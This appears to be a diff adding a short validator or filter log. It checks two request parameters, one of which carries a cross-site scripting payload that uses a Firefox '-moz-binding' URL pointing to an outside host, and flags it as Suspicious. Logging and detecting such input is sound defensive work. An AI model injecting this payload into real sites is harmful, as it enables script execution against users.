@@ -1,0 +1,5 @@
+2016-06-24T06:26:17.354-06:00
+name : ws'.nY0W8yJyn.'  E S .s8
+desc : sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+The parameter: name :  having value: ws'.nY0W8yJyn.'  E S .s8 is: Compliant
+The parameter: desc :  having value: sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a=" is: Suspicious
